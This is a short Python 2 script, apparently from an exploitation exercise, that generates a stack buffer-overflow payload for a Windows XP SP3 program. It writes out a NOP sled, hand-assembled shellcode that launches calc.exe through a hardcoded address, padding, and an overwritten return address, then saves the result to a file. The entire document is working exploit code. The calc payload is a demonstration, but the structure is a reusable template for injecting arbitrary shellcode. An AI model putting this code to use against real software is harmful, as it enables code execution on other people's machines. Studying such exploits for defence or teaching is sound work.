#Uses the same approach as linux

n=132
nops_count=12
trap_count=4

#make sure that a jmp can be made anywhere in the buffer
#by inserting nops instruction before the actual shell code 
nopsled = '\x90' * nops_count
#shellcode = '\xcc' * trap_count

# calc.exe shellcode for WinXP (SP3) on stack
shellcode = "\x31\xC9"                  # xor ecx,ecx
shellcode += "\x51"                     # push ecx
shellcode += "\x68\x63\x61\x6C\x63"     # push 0x636c6163
shellcode += "\x54"                     # push dword ptr esp
shellcode += "\xB8\xC7\x93\xC2\x77"     # mov eax,0x77c293c7
shellcode += "\xFF\xD0"                 # call eax

pad = 'A' * (n - nops_count - len(shellcode))
#rip = 'ABCD'

rip = '\xEC\xFE\x13\x00'

payload = nopsled + shellcode + pad + rip

print payload

try:
    f = open("C:\\simple_exploit_payload.bin", "wb") # Exploit output will be written to C directory
    f.write(payload)                        # Write entirety of buffer out to file
    f.close()                           # Close file
    print "\nExploit written successfully!"
    print "Buffer size: " + str(len(payload)) + "\n" # Buffer size sanity check to ensure there's nothing funny going on
except Exception, e:
    print "\nError! Exploit could not be generated, error details follow:\n"
    print str(e) + "\n"
